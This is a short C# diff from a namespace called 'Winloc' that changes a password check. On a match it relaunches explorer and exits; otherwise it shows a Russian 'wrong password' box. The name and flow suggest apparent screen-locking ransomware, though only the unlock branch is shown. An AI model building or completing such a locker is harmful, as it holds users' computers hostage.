@@ -42,7 +42,7 @@ namespace Winloc
                 Process.Start("explorer");
                 Environment.Exit(0);
             }
-            else
+            else if (pass != Convert.ToBase64String(md5))
             {
                 MessageBox.Show("Пароль неверный!", "Нееее!", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
